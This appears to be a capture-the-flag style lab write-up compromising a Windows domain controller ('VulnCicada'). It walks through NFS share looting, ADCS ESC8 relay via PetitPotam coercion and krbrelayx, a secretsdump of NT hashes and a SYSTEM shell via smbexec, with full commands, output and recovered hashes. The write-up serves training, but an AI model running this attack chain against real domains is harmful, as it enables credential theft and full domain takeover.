## VulnCicada

### Lab Details 

- Difficulty: Medium
- Type: NFS, ACDS , Active Directory, Windows

#### Enumeration
- run `nmap`
```bash
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-11 05:44:49Z)
111/tcp   open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2025-10-11T05:19:04
|_Not valid after:  2026-10-11T05:19:04
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2025-10-11T05:19:04
|_Not valid after:  2026-10-11T05:19:04
2049/tcp  open  nlockmgr      1-4 (RPC #100021)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2025-10-11T05:19:04
|_Not valid after:  2026-10-11T05:19:04
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2025-10-11T05:19:04
|_Not valid after:  2026-10-11T05:19:04
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Not valid before: 2025-10-10T05:26:51
|_Not valid after:  2026-04-11T05:26:51
|_ssl-date: 2025-10-11T05:46:26+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
```
- enumerate `NFS` on target
```bash
$ showmount -e cicada.vl
Export list for cicada.vl:
/profiles (everyone)
```
- there is a `/profile` share that's available
- mount it locally
```bash
$ sudo mount -t nfs -o rw cicada.vl:/profiles /mnt
```
- check the directory content
```bash
$ tree /mnt
/mnt
├── Administrator
│   ├── Documents
│   │   ├── $RECYCLE.BIN
│   │   │   └── desktop.ini
│   │   └── desktop.ini
│   └── vacation.png
<SNIP>
├── Rosie.Powell
│   ├── Documents
│   │   ├── $RECYCLE.BIN
│   │   │   └── desktop.ini
│   │   └── desktop.ini
│   └── marketing.png
└── Shirley.West
```
- there are two images and we can move them to local directory and inspect them
- due to `NFS` permission we will need to change the permission of `marketing.png` else we will not able to open the image
```bash
$ sudo cp /mnt/Rosie.Powell/marketing.png .
$ sudo chmod 777 /tmp/marketing.png
```
- view the image, `marketing.png` shows a sticky note with a string on it
![[marketing.png]]

#### Initial Foothold 
- check the credential against target
- `Rosie.Powell:Cicada123` is valid
```bash
$ nxc smb DC-JPQ225.cicada.vl -u Rosie.Powell -p Cicada123 -k      
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:False)
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\Rosie.Powell:Cicada123
```


#### Lateral Movement (If any)

#### Privilege Escalation
- check for any vulnerabilities with `ADCS` on target
```bash
$ certipy find -target DC-JPQ225.cicada.vl -u Rosie.Powell@cicada.vl -p Cicada123 -k -vulnerable -stdout
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Trying to get CA configuration for 'cicada-DC-JPQ225-CA' via CSRA
[!] Got error while trying to get CA configuration for 'cicada-DC-JPQ225-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'cicada-DC-JPQ225-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'cicada-DC-JPQ225-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : cicada-DC-JPQ225-CA
    DNS Name                            : DC-JPQ225.cicada.vl
    Certificate Subject                 : CN=cicada-DC-JPQ225-CA, DC=cicada, DC=vl
    Certificate Serial Number           : 313EC7CB7592BE9C4B34051C4B586C54
    Certificate Validity Start          : 2025-10-11 12:16:31+00:00
    Certificate Validity End            : 2525-10-11 12:26:31+00:00
    Web Enrollment                      : Enabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : CICADA.VL\Administrators
      Access Rights
        ManageCertificates              : CICADA.VL\Administrators
                                          CICADA.VL\Domain Admins
                                          CICADA.VL\Enterprise Admins
        ManageCa                        : CICADA.VL\Administrators
                                          CICADA.VL\Domain Admins
                                          CICADA.VL\Enterprise Admins
        Enroll                          : CICADA.VL\Authenticated Users
    [!] Vulnerabilities
      ESC8                              : Web Enrollment is enabled and Request Disposition is set to Issue
Certificate Templates                   : [!] Could not find any 
```
- from the output we see that the target is vunlerable to `ESC8`
- we can attempt to exploit this by tricking the DC to authenticate to us and then relay the authentication to that endpoint and get a certificate as the DC 
- firstly we will need to add a record to DC, ensure the record points back to us
```bash
$ ./bloodyAD.py -u Rosie.Powell -p Cicada123 -d cicada.vl -k --host DC-JPQ225.cicada.vl add dnsRecord DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA 10.10.16.56
```

- **NOTE**: before launching the attack ensure `ANSWER SECTION` exists and contains the correct attacker/local IP address e.g. `DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA.cicada.vl. 300 IN A 10.10.16.56`
- then `git clone` the [`krbrelayx repo`](https://github.com/dirkjanm/krbrelayx.git)
- start up the relay server
```bash
$ ./krbrelayx.py -t 'http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp' --adcs --template DomainController -v 'DC-JPQ225$'
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Running in attack mode to single host
[*] Running in kerberos relay mode because no credentials were specified.
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up DNS Server
```
- check that `ANSWER SECTION` exists and points back to us
```bash
$ dig DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA.cicada.vl @10.129.210.9

; <<>> DiG 9.20.4-4-Debian <<>> DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA.cicada.vl @10.129.210.9
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 62801
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA.cicada.vl. IN A

;; ANSWER SECTION:
DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA.cicada.vl. 300 IN A 10.10.16.56

;; Query time: 307 msec
;; SERVER: 10.129.210.9#53(10.129.210.9) (UDP)
;; WHEN: Sat Oct 11 18:45:02 PDT 2025
;; MSG SIZE  rcvd: 108
```
- run the exploit to trigger for authentication 
```bash
$ nxc smb DC-JPQ225.cicada.vl -u Rosie.Powell -p Cicada123 -k -M coerce_plus -o LISTENER=DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA METHOD=PetitPotam
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:False)
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\Rosie.Powell:Cicada123 
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, PetitPotam
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        Exploit Success, lsarpc\EfsRpcAddUsersToFile
```
- check the relay server and we see updates
```bash
$ ./krbrelayx.py -t 'http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp' --adcs --template DomainController -v 'DC-JPQ225$'
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Running in attack mode to single host
[*] Running in kerberos relay mode because no credentials were specified.
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up DNS Server

[*] Servers started, waiting for connections
[*] SMBD: Received connection from 10.129.210.9
[*] HTTP server returned status code 200, treating as a successful login
[*] Generating CSR...
[*] CSR generated!
[*] Getting certificate...
[*] SMBD: Received connection from 10.129.210.9
[*] HTTP server returned status code 200, treating as a successful login
[*] Skipping user DC-JPQ225$ since attack was already performed
[*] GOT CERTIFICATE! ID 92
[*] Writing PKCS#12 certificate to ./DC-JPQ225$.pfx
[*] Certificate successfully written to file
```
- we can use the `pfx` file to get a `TGT`
```bash
 certipy-ad auth -pfx DC-JPQ225\$.pfx -dc-ip 10.129.210.9 
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: dc-jpq225$@cicada.vl
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'dc-jpq225.ccache'
[*] Trying to retrieve NT hash for 'dc-jpq225$'
[*] Got hash for 'dc-jpq225$@cicada.vl': aad3b435b51404eeaad3b435b51404ee:a65952c664e9cf5de60195626edbeee3
```
- then use that to dump hashes on target
```bash
$ impacket-secretsdump cicada.vl/dc-jpq225\$@DC-JPQ225.cicada.vl -hashes ":a65952c664e9cf5de60195626edbeee3" -k 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[-] CCache file is not found. Skipping...
Administrator:500:aad3b435b51404eeaad3b435b51404ee:85a0da53871a9d56b6cd05deda3a5e87:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8dd165a43fcb66d6a0e2924bb67e040c:::
cicada.vl\Shirley.West:1104:aad3b435b51404eeaad3b435b51404ee:ff99630bed1e3bfd90e6a193d603113f:::
cicada.vl\Jordan.Francis:1105:aad3b435b51404eeaad3b435b51404ee:f5caf661b715c4e1435dfae92c2a65e3:::
cicada.vl\Jane.Carter:1106:aad3b435b51404eeaad3b435b51404ee:7e133f348892d577014787cbc0206aba:::
<SNIP>
```
- authenticate as admin using `smbexec`
```bash
$ impacket-smbexec cicada.vl/administrator@DC-JPQ225.cicada.vl -hashes ":85a0da53871a9d56b6cd05deda3a5e87" -k 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>whoami
nt authority\system
```
#### Resources

#### Lesson Learned
